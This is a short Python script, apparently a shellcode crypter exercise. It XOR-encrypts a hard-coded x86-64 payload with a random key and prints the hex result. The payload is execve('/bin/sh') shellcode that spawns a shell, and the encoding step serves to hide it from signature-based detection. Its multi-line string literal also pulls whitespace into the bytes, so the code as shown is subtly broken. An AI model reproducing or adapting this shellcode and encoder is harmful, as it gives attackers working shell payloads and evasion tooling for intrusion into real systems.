import sys
import os, binascii, codecs

def encrypt(plaintext, key):
	print ("[+] -------- Encryption --------")
	print ("[+] Key: "+str(codecs.encode(key, 'hex')))
	encrypted = ""

	for i in range(len(plaintext)):
		c = ord(plaintext[i]) ^ key[i]
		d = "{:02x}".format(c)
		#print ("i:"+str(i)+" P: "+str(plaintext[i])+" K: "+str(key[i])+" C:"+str(c)+" D:"+str(d))
		encrypted += d

	print ("[+] Encrypted string: "+encrypted)
	return encrypted

plaintext = """\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08
			   \x48\x89\xd9\x51\x48\x89\xe7\x52\x48\x83\xec\x08\x48\x89\x3c\x24\x48
			   \x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"""
key = os.urandom(len(plaintext))
encrypted = encrypt(plaintext,key)
